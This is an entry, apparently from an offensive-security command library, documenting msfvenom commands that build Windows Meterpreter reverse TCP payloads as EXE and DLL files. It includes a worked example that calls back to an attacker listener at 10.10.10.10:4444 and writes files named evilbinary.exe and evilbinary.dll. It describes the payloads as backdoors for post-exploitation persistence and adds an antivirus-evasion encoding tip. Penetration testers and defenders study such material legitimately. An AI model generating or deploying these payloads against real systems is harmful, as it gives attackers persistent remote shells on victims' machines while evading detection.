---
id: ee318960-f0e9-42c3-bf85-be8ff693561e
name: create-meterpreter-reverse-tcp-payloads
type: command
executor: bash
data: >-
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f exe
  > $_OUTPUT_EXE

  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f dll
  > $_OUTPUT_DLL
output: null
created_at: '2023-04-06T03:56:28.015358+00:00'
updated_at: '2023-04-10T20:37:21.623497+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - metasploit
verified: true
validated: true
---

# create-meterpreter-reverse-tcp-payloads

## Command

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f exe > $_OUTPUT_EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f dll > $_OUTPUT_DLL
```

## Description

This multi-line command uses msfvenom to generate two Meterpreter reverse TCP payloads: one in EXE format for direct execution and one in DLL format for potential injection or hijacking. It is used during post-exploitation to prepare backdoors for persistence mechanisms like registry modifications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | IP address of the attacker's listener | Yes |
| $_LPORT | Port on which the listener (e.g., msfconsole) is running | Yes |
| $_OUTPUT_EXE | Output filename for the EXE payload (e.g., evilbinary.exe) | Yes |
| $_OUTPUT_DLL | Output filename for the DLL payload (e.g., evilbinary.dll) | Yes |
| -p windows/meterpreter/reverse_tcp | Payload type for reverse shell | Built-in |
| -f exe/dll | Output format | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evilbinary.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evilbinary.dll
```

### Advanced Usage

Use with encoding to evade AV: add `-e x86/shikata_ga_nai -i 3` after the payload.

## Expected Output

No console output; successful execution creates the specified files in the current directory. Verify with `ls -la $_OUTPUT_EXE $_OUTPUT_DLL` or `file $_OUTPUT_EXE` (should show PE executable).

## Related

- [[procedures/windows-registry-hklm-winlogon-persistence]]
